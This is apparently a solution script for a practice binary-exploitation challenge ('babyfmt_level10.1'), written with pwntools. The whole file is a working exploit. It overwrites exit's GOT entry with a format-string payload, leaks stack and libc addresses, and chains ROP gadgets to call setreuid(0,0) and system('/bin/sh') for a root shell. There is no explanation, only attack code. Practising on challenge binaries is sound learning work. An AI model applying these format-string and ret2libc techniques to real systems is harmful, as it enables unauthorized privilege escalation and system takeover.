from pwn import *
BINARY = "/challenge/babyfmt_level10.1"

context.arch = 'amd64'

elf = ELF(BINARY)
rop = ROP(elf)

# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug(BINARY, gdbscript="source /opt/gef/gef.py")
p = process(BINARY)

# write func to exit@got
payload = b"A" * 1 + fmtstr_payload(71, {elf.got['exit']: elf.sym['func']}, numbwritten = 136)
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvline()
p.recv()

# leak stack addr
payload = b"%186$p"
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvuntil(b"\n")
output = p.recv()[0:14]
ret_rbp = int(output, 16) - 0x5b0 - 0x5b0
ret = ret_rbp + 0x8


pop_rdi = rop.rdi.address
leave_ret = 0x4015B1

rop.raw(pop_rdi)
rop.raw(elf.got['puts'])
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['func'])

print("main rbp : {}".format(hex(ret_rbp)))
print("main ret loc: {}".format(hex(ret)))
payload = b"A" * 1 + fmtstr_payload(71, {elf.got['exit']: leave_ret, ret: rop.chain()}, numbwritten = 136)
p.send(payload)
p.recvline(b"Your input is:")

puts_addr = unpack(p.recvuntil(b'\n')[-7:-1], 'all')
print("puts addr = {}".format(hex(puts_addr)))

# system(/bin/sh)
libc = ELF(p.libc.path)
libc.address = puts_addr - libc.symbols['puts']
print("libc base = {}".format(hex(libc.address)))

bin_sh = next(libc.search(b'/bin/sh'))
libc_rop = ROP(libc)
libc_rop.setreuid(0, 0)
libc_rop.system(bin_sh)

payload = b"A" * 1 + fmtstr_payload(71, {elf.got['exit']: leave_ret, ret + 0x10: libc_rop.chain()}, numbwritten = 136)
print(payload)
p.send(payload)
p.interactive()